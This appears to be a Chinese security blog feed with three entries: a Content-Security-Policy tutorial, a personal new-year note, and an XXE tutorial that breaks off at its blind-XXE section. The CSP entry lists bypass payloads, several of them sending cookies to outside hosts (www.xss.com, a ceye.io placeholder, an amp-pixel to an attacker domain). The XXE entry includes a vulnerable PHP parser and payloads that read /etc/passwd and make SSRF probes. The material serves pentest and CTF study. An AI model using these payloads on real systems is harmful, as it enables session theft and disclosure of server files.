<h4 id="功能效果"><a href="#功能效果" class="headerlink" title="功能效果"></a>功能效果</h4><p>主要用来防注入脚本（比如 xss 加载其他域下的js；广告注入h5页面、运营商的http劫持）图片、iframe、fton、style等等可能的远程的资源</p>
<ul>
<li>限制远程资源的请求，如通过远程请求将资源如cookie传送出去</li>
<li>记录违规的限制行为，并汇报给指定目标。</li>
</ul>
<h5 id="CSP和同源策略"><a href="#CSP和同源策略" class="headerlink" title="CSP和同源策略"></a>CSP和同源策略</h5><p>在同源策略中 一个页面的资源只能从与之同源的服务器获取，不能从其他域获取；但因此也影响了灵活性，CSP相对来说 可以跨域获取资源，又能防止恶意代码。</p>
<h5 id="使用方式："><a href="#使用方式：" class="headerlink" title="使用方式："></a>使用方式：</h5><h6 id="要素"><a href="#要素" class="headerlink" title="要素"></a>要素</h6><p>CSP域：允许使用CSP的规则</p>
<p>CSP指令集：允许白名单的内容规则<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">示例</span><br><span class="line"></span><br><span class="line">default-src &apos;self&apos;;   </span><br><span class="line"></span><br><span class="line">只允许同源下的资源</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">script-src &apos;self&apos;;     </span><br><span class="line"></span><br><span class="line">只允许同源下的js</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">script-src &apos;self&apos; www.google-analytics.com ajax.googleapis.com;</span><br><span class="line"></span><br><span class="line">允许同源以及两个地址下的js加载</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">default-src &apos;none&apos;; script-src &apos;self&apos;; connect-src &apos;self&apos;; img-src &apos;self&apos;; style-src &apos;self&apos;;</span><br><span class="line"></span><br><span class="line">多个资源时,后面的会覆盖前面的</span><br></pre></td></tr></table></figure></p>
<ul>
<li>常见csp策略</li>
</ul>
<table>
<thead>
<tr>
<th>指令</th>
<th>指令和指令值示例</th>
<th>指令说明 </th>
</tr>
</thead>
<tbody>
<tr>
<td>default-src</td>
<td>‘self’ cdn.guangzhul.com</td>
<td>默认加载策略</td>
</tr>
<tr>
<td>script-src</td>
<td>‘self’ js.guangzhul.com</td>
<td>对 JavaScript 的加载策略。</td>
</tr>
<tr>
<td>style-src</td>
<td>‘self’ css.guangzhul.com</td>
<td>对样式的加载策略。</td>
</tr>
<tr>
<td>img-src</td>
<td>‘self’ img.guangzhul.com</td>
<td>对图片的加载策略。</td>
</tr>
<tr>
<td>connect-src</td>
<td>‘self’</td>
<td>对 Ajax、WebSocket 等请求的加载策略。不允许的情况下，浏览器会模拟一个状态为 400 的响应。</td>
</tr>
<tr>
<td>font-src</td>
<td>font.cdn.guangzhul.com</td>
<td>针对 WebFont 的加载策略。</td>
</tr>
<tr>
<td>object-src</td>
<td>‘self’</td>
<td>针对 、 或 等标签引入的 flash 等插件的加载策略。</td>
</tr>
<tr>
<td>media-src</td>
<td>media.cdn.guangzhul.com</td>
<td>针对媒体引入的 HTML 多媒体的加载策略。</td>
</tr>
<tr>
<td>frame-src</td>
<td>‘self’</td>
<td>针对 frame 的加载策略。</td>
</tr>
<tr>
<td>report-uri</td>
<td>/report-uri</td>
<td>告诉浏览器如果请求的资源不被策略允许时，往哪个地址提交日志信息。 特别的：如果想让浏览器只汇报日志，不阻止任何内容，可以改用 Content-Security-Policy-Report-Only 头。</td>
</tr>
</tbody>
</table>
<ul>
<li>其他CSP指令</li>
</ul>
<table>
<thead>
<tr>
<th>指令</th>
<th>指令和指令值示例</th>
<th>指令说明 </th>
</tr>
</thead>
<tbody>
<tr>
<td>sandbox</td>
<td></td>
<td>设置沙盒环境</td>
</tr>
<tr>
<td>child-src</td>
<td></td>
<td>主要防御 <frame>,<iframe></iframe></td>
</tr>
<tr>
<td>form-action</td>
<td></td>
<td>主要防御 <form></form></td>
</tr>
<tr>
<td>frame-ancestors</td>
<td></td>
<td>主要防御 <frame>,<iframe>,<object>,<embed>,<applet></applet></object></iframe></td>
</tr>
<tr>
<td>plugin-types</td>
<td></td>
<td>主要防御 <object>,<embed>,<applet></applet></object></td>
</tr>
</tbody>
</table>
<ul>
<li>常见指令值</li>
</ul>
<table>
<thead>
<tr>
<th>指令值</th>
<th>指令和指令值示例</th>
<th>指令值说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>*</td>
<td>img-src *</td>
<td>允许任何内容。</td>
</tr>
<tr>
<td>‘none’</td>
<td>img-src ‘none’</td>
<td>不允许任何内容。</td>
</tr>
<tr>
<td>‘self’</td>
<td>img-src ‘self’</td>
<td>允许来自相同来源的内容（相同的协议、域名和端口）。</td>
</tr>
<tr>
<td>data:</td>
<td>img-src data:</td>
<td>允许 data: 协议（如 base64 编码的图片）。</td>
</tr>
<tr>
<td><a href="http://www.guangzhul.com" target="_blank" rel="noopener">www.guangzhul.com</a></td>
<td>img-src</td>
<td>img.guangzhul.com    允许加载指定域名的资源。</td>
</tr>
<tr>
<td>*.guangzhul.com</td>
<td>img-src *.guangzhul.com    允许加载 guangzhul.com</td>
<td>任何子域的资源。</td>
</tr>
<tr>
<td>‘unsafe-inline’</td>
<td>script-src ‘unsafe-inline’</td>
<td>允许加载 inline 资源（例如常见的 style 属性，onclick，inline js 和 inline css 等等）。</td>
</tr>
<tr>
<td>‘unsafe-eval’</td>
<td>script-src ‘unsafe-eval’</td>
<td>允许加载动态 js 代码，例如 eval()。</td>
</tr>
</tbody>
</table>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">限制所有的外部资源，都只能从当前域名加载</span><br><span class="line">Content-Security-Policy: default-src &apos;self&apos;</span><br></pre></td></tr></table></figure>
<p>可以由http header和html来指定,启用后，不符合 CSP 的外部资源就会被阻止加载。</p>
<h5 id="http-header"><a href="#http-header" class="headerlink" title="http header"></a>http header</h5><p>在服务端的响应包的header中展示 内容均来自于应用自己域，不涉及子域<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy:default-src&apos;self&apos;</span><br></pre></td></tr></table></figure></p>
<h5 id="html中通过meta来限制"><a href="#html中通过meta来限制" class="headerlink" title="html中通过meta来限制"></a>html中通过meta来限制</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src &apos;self&apos;; object-src &apos;none&apos;; style-src cdn.example.org third-party.org; child-src https:&quot;&gt;</span><br></pre></td></tr></table></figure>
<h4 id="构建一下csp-来个例子"><a href="#构建一下csp-来个例子" class="headerlink" title="构建一下csp 来个例子"></a>构建一下csp 来个例子</h4><h5 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h5><p>首先要在配置文件中加载mod_headers.so模块，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo  a2enmod headers</span><br></pre></td></tr></table></figure></p>
<p>在对应的配置文件中，我用的apache2.conf进行配置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LoadModule headers_module modules/mod_headers.so</span><br></pre></td></tr></table></figure>
<p>然后可以添加相关规则<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Header set Content-Security-Policy &quot;default-src &apos;self&apos;;&quot;</span><br></pre></td></tr></table></figure></p>
<h5 id="常见绕过方式"><a href="#常见绕过方式" class="headerlink" title="常见绕过方式"></a>常见绕过方式</h5><h6 id="1-文件上传绕过-只允许加载当前域"><a href="#1-文件上传绕过-只允许加载当前域" class="headerlink" title="1 文件上传绕过  只允许加载当前域"></a>1 文件上传绕过  只允许加载当前域</h6><p>最常见规则如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header(&quot;Content-Security-Policy: default-src &apos;self&apos;; script-src &apos;self&apos; &quot;);</span><br></pre></td></tr></table></figure></p>
<p>针对这种方式，通常使用方法是 找一个文件上传点，上传一个文件内容为js的图片<br>说到这里 注意一下，浏览器对一个文件做解析/下载 处理的,并不是文件的后缀名<br>而是服务器返回的mimeType,如果在服务端没有定义的类型，即通俗的mimes.type中没有定义，即没有返回content-type<br>则在apache服务器中会默认以html格式解析（在nginx服务器中会以octet-stream，直接下载，这里可以使用svg后缀触发svg标签。条件允许的话），所以在遇到上传黑名单的时候，可以试试xx类似的。</p>
<p>测试过程中 一来就折戟沉沙，头大，使用 该规则后，简单测试 xx文件后缀，直接嵌入script标签，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<p>竟然没用，一顿瞎操作后才确定，是因为制定了csp规则的问题。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script-src &apos;self&apos;; 或者 default-src &apos;self&apos;</span><br></pre></td></tr></table></figure></p>
<p>要允许内联的js执行，即添加 “unsafe-inline”</p>
<ul>
<li>不允许内联时 测试的时候直接alert是没法触发的，所以在常规渗透测试的时候要注意，这个时候用 script src 这类引用是可以的，引用上传的同域js 执行。</li>
</ul>
<p>使用下列js伪协议的payload可以绕过safari（ 12.0.2 ）的csp检测，chrome和firefox不行，猜测可能跟csp检测顺序阶段有关（待深入讨论）。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/object&gt;</span><br><span class="line"></span><br><span class="line">&lt;a href=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pOzwvc2NyaXB0Pg==&quot; &gt;test&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;</span><br><span class="line"></span><br><span class="line">Bypass CSP by @akita_zen</span><br><span class="line"></span><br><span class="line">Works for CSP like script-src self</span><br></pre></td></tr></table></figure></p>
<ul>
<li>允许内联时</li>
</ul>
<p>可以正常输入输出测试</p>
<h6 id="2、预加载-标签rel属性-绕过只允许加载当前域"><a href="#2、预加载-标签rel属性-绕过只允许加载当前域" class="headerlink" title="2、预加载 标签rel属性 绕过只允许加载当前域"></a>2、预加载 <link>标签rel属性 绕过只允许加载当前域</h6><p>谈到这个问题就不得不说一下浏览器的预加载/预读取</p>
<ul>
<li>2.1 预加载</li>
</ul>
<p>预加载：目的和js压缩、cdn等类似都是优化浏览器请求时加快请求速度，让浏览器在空闲时间下载或读取资源，用户在将来将会访问这些资源。一个Web页面可以对浏览器设置一系列的预加载指示，当浏览器加载完当前页面后，它会在后台静悄悄的加载指定的文档，并把它们存储在缓存里。当用户访问到这些预加载的文档后，浏览器能快速的从缓存里提取给用户。（来自MDN的解释）</p>
<ul>
<li>2.1.1 预加载例子</li>
</ul>
<p>【1】prefetch 预加载资源-旧版chrome可用</p>
<p>实现方法： 通过link实现，将rel属性指定为“prefetch”，在href中指定加载资源的地址。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 预加载整个页面 --&gt;</span><br><span class="line">&lt;link rel=&quot;prefetch&quot; href=&quot;http://www.webhek.com/misc/3d-album/&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 预加载一个图片 --&gt;</span><br><span class="line">&lt;link rel=&quot;prefetch&quot; href=&quot; http://www.webhek.com/wordpress/</span><br><span class="line">wp-content/uploads/2014/04/b-334x193.jpg &quot; /&gt;</span><br></pre></td></tr></table></figure>
<p>【2】prerender chrome预渲染-可用</p>
<p>对对应地址所有资源进行渲染<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;prerender&quot; href=&quot;http://linux.im&quot;&gt;</span><br></pre></td></tr></table></figure></p>
<p>【3】dns-prefetch DNS预解析-可用</p>
<p>故名思意，DNS预解析 提前将分析页面所需资源域名进行ip转换，使之在请求时尽快完成DNS解析。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;dns-prefetch&quot; href=&quot;http://linux.im&quot;&gt;</span><br></pre></td></tr></table></figure></p>
<p>【4】除此之外还有Preconnect(-可用 类似于dns-prefetch，同时会完成握手机制)、subresource、preload<br>这里接触不多，就不一一多提了。</p>
<ul>
<li>2.1.2 预加载的绕过</li>
</ul>
<p>回到我们的重点，预加载针对的CSP绕过规则<br>在限制了资源请求时，在xss中想要把cookie传送出去</p>
<p>限制如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header(&quot;Content-Security-Policy: default-src &apos;self&apos;; script-src &apos;self&apos; &quot;);</span><br></pre></td></tr></table></figure></p>
<p>限制了不可信资源的请求，且不允许内联执行这个时候就可以用预加载方式进行绕过 传出需要的数据<br>如：</p>
<p>【1】 dns-prefetch<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;dns-prefetch&quot; href=&quot;http://1221.xxxx.ceye.io&quot;&gt;</span><br></pre></td></tr></table></figure></p>
<p>这个时候就可以在ceye上查看相关dns请求记录</p>
<p>【2】prefetch<br>在Chrome下，可以使用如下标签发送cookie（最新版Chrome会禁止）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;prefetch&quot; href=&quot;http://1221.xxxx.ceye.io&quot;&gt;</span><br></pre></td></tr></table></figure></p>
<p>【3】Preconnect、prerender 均测可用，其他的暂未测试。</p>
<p>以下也尚未测试 尴尬 仅摘抄，先写到这吧</p>
<h6 id="3-url跳转"><a href="#3-url跳转" class="headerlink" title="3 url跳转"></a>3 url跳转</h6><p>在规则限制为 default-src ‘none’的情况下，此时策略为 默认策略 禁止所有资源（不允许加载所有内容）</p>
<p>可以使用meta标签实现跳转<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;refresh&quot; content=&quot;1;url=http://www.xss.com/x.php?c=[cookie]&quot; &gt;</span><br></pre></td></tr></table></figure></p>
<p>在允许unsafe-inline的情况下，可以用window.location，或者window.open之类的方法进行跳转绕过。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  window.location=&quot;http://www.xss.com/x.php?c=[cookie]&quot;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<h6 id="4-利用浏览器补全"><a href="#4-利用浏览器补全" class="headerlink" title="4 利用浏览器补全"></a>4 利用浏览器补全</h6><p>有些网站限制只有某些脚本才能使用，往往会使用<script>标签的nonce属性，只有nonce一致的脚本才生效，比如CSP设置成下面这样：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;none&apos;;script-src &apos;nonce-abc&apos;</span><br></pre></td></tr></table></figure></p>
<p>那么当脚本插入点为如下的情况时</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;插入点&lt;/p&gt;</span><br><span class="line">&lt;script id=&quot;aa&quot; nonce=&quot;abc&quot;&gt;document.write(&apos;CSP&apos;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>可以插入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=//14.rs a=&quot;</span><br><span class="line"></span><br><span class="line">这样会拼成一个新的script标签，其中的src可以自由设定</span><br><span class="line">&lt;p&gt;&lt;script src=//14.rs a=&quot;&lt;/p&gt;</span><br><span class="line">&lt;script id=&quot;aa&quot; nonce=&quot;abc&quot;&gt;document.write(&apos;CSP&apos;);&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<h6 id="5-代码重用"><a href="#5-代码重用" class="headerlink" title="5 代码重用"></a>5 代码重用</h6><p>Blackhat2017上有篇ppt总结了可以被用来绕过CSP的一些JS库。<br>例如假设页面中使用了Jquery-mobile库，并且CSP策略中包含”script-src ‘unsafe-eval’”或者”script-src ‘strict-dynamic’”，那么下面的向量就可以绕过CSP：</p>
<div data-role=popup id='<script>alert(1)</script>'>

</p><p>在这个PPT之外的还有一些库也可以被利用，例如RCTF2018中遇到的amp库，下面的标签可以获取名字为FLAG的cookie</p>
<p><amp-pixel src="http://your domain/?cid=CLIENT_ID(FLAG)"></amp-pixel>  </p>
<h6 id="iframe"><a href="#iframe" class="headerlink" title="iframe"></a>iframe</h6><p>1.如果页面A中有CSP限制，但是页面B中没有，同时A和B同源，那么就可以在A页面中包含B页面来绕过CSP：</p>
<iframe src="B"></iframe>

<p>2.在Chrome下，iframe标签支持csp属性，这有时候可以用来绕过一些防御，例如”<a href="http://xxx&quot;页面有个js库会过滤XSS向量，我们就可以使用csp属性来禁掉这个js库。" target="_blank" rel="noopener">http://xxx&quot;页面有个js库会过滤XSS向量，我们就可以使用csp属性来禁掉这个js库。</a></p>
<iframe csp="script-src 'unsafe-inline'" src="http://xxx"></iframe>

<h6 id="meta标签"><a href="#meta标签" class="headerlink" title="meta标签"></a>meta标签</h6><p>meta标签有一些不常用的功能有时候有奇效：<br>meta可以控制缓存（在header没有设置的情况下），有时候可以用来绕过CSP nonce。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;cache-control&quot; content=&quot;public&quot;&gt;</span><br><span class="line"></span><br><span class="line">meta可以设置Cookie（Firefox下），可以结合self-xss利用。</span><br><span class="line">&lt;meta http-equiv=&quot;Set-Cookie&quot; Content=&quot;cookievalue=xxx;expires=Wednesday,21-Oct-98 16:14:21 GMT; path=/&quot;&gt;</span><br></pre></td></tr></table></figure></p>
<h5 id="默认特性"><a href="#默认特性" class="headerlink" title="默认特性"></a>默认特性</h5><ul>
<li>阻止内联代码的执行</li>
<li>eval 相关功能被禁用</li>
</ul>
<h5 id="防护问题："><a href="#防护问题：" class="headerlink" title="防护问题："></a>防护问题：</h5><h5 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://www.ruanyifeng.com/blog/2016/09/csp.html</span><br><span class="line">https://blog.csdn.net/qq_37943295/article/details/79978761</span><br><span class="line">https://paper.seebug.org/423/</span><br><span class="line">https://xz.aliyun.com/t/318</span><br><span class="line">https://paper.seebug.org/91/</span><br><span class="line">http://www.webhek.com/post/link-prefetch.html</span><br></pre></td></tr></table></figure>
<h5 id="存疑"><a href="#存疑" class="headerlink" title="存疑"></a>存疑</h5><p>【1】内联js的定义 <script src=""></script>属于内联还是外联<br>（通俗的来说 内联 即属于script标签内直接调用，外联属于调用外部js）</p>
]]></content>
      
        <categories>
            
            <category> 浏览器安全策略 </category>
            
            <category> csp </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 浏览器安全策略 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[2019]]></title>
      <url>/2019/01/01/2019/</url>
      <content type="html"><![CDATA[<p>  随着2018的过去，生活不知不觉的过去的一年，这一年里感觉多多少少还是需要说点啥，先总的一说，总体还是比较满意的，顺利的毕业、顺利的工作，但近段时间以来，感觉个人浮躁了很多，可能是根本就没让自己沉淀下来吧，新的一年，还是给自己树立一个小的flag吧。</p>
<ul>
<li>重新规划技术成长的节奏</li>
<li>团队技术性成长</li>
<li>回归生活 </li>
<li>先学会吉他</li>
<li>开始练字静心</li>
</ul>
]]></content>
      
        
        <tags>
            
            <tag> 生活 </tag>
            
            <tag> 规划 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[XXE 示例及利用]]></title>
      <url>/2018/12/24/Web%E6%B8%97%E9%80%8F/XXE/XXE%E7%A4%BA%E4%BE%8B%E5%8F%8A%E5%BA%94%E7%94%A8/</url>
      <content type="html"><![CDATA[<p>[TOC]</p>
<p>注：<br>libxml2.9.0以后，默认不解析外部实体，导致XXE漏洞逐渐消亡。为了演示PHP环境下的XXE漏洞，本例会将libxml2.8.0版本编译进PHP中。PHP版本并不影响XXE利用</p>
<h3 id="简析XXE"><a href="#简析XXE" class="headerlink" title="简析XXE"></a>简析XXE</h3><p>php漏洞示例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$data = file_get_contents(&apos;php://input&apos;);</span><br><span class="line">$xml = simplexml_load_string($data);</span><br><span class="line">echo $xml-&gt;name;</span><br></pre></td></tr></table></figure></p>
<p>其中发送请求的请求头：当前客户端可以接收的文档类型。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br></pre></td></tr></table></figure></p>
<p>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line">&lt;!ENTITY passwd SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;</span><br><span class="line">&lt;a&gt;</span><br><span class="line">        &lt;name&gt;&amp;passwd;&lt;/name&gt; 标签可以自定义，但由于echo$xml-&gt;name，然后echo 只能处理字符串，对其他变量不能处理，因此此处用print_r 效果更好 </span><br><span class="line">&lt;/a&gt;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li><p>直接通过外部实体DTD声明</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>通过外部实体引入外部DTD文档，再引入外部实体声明[没有验证成功，更换引用本地dtd也只能读取，解析出错]<br>这种命名实体调用外部实体，发现xxe.dtd中不能定义/声明实体，否则解析不了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE xxe </span><br><span class="line">[&lt;!ENTITY  a  SYSTEM &quot;http://127.0.0.1:8888/test/xxe.dtd&quot; &gt;]&gt;</span><br><span class="line"></span><br><span class="line">&lt;name&gt;&amp;b;&lt;/name&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>通过外部参数实体引入外部实体声明</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">        &lt;!ENTITY % xxe SYSTEM &quot;http://127.0.0.1:8888/test/xxe.dtd&quot; &gt;</span><br><span class="line">%xxe;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;name&gt;&amp;b;&lt;/name&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="XXE攻击面的拓展"><a href="#XXE攻击面的拓展" class="headerlink" title="XXE攻击面的拓展"></a>XXE攻击面的拓展</h3><h4 id="XXE漏洞检测流程"><a href="#XXE漏洞检测流程" class="headerlink" title="XXE漏洞检测流程"></a>XXE漏洞检测流程</h4><h5 id="有回显测试"><a href="#有回显测试" class="headerlink" title="有回显测试"></a>有回显测试</h5><ul>
<li><p>测试是否解析xml：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=”1.0” encoding=”UTF-8”?&gt;</span><br><span class="line"> </span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY test &quot;test&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line"> </span><br><span class="line">&lt;root&gt;&amp;test;&lt;/root&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>测试是否支持外部实体<br>用外部参数/普通实体测试一下 (system)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h5 id="无回显测试"><a href="#无回显测试" class="headerlink" title="无回显测试"></a>无回显测试</h5><p>无防火墙的情况下，可以尝试ssrf<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://xx.xx.xx.xx/&quot;&gt;</span><br><span class="line">%remote;]&gt;</span><br></pre></td></tr></table></figure></p>
<h4 id="面对有回显和无回显部分"><a href="#面对有回显和无回显部分" class="headerlink" title="面对有回显和无回显部分"></a>面对有回显和无回显部分</h4><p>有回显比较简单暂不考虑</p>
<p>无回显：Blind XXE 构建带外信道</p>
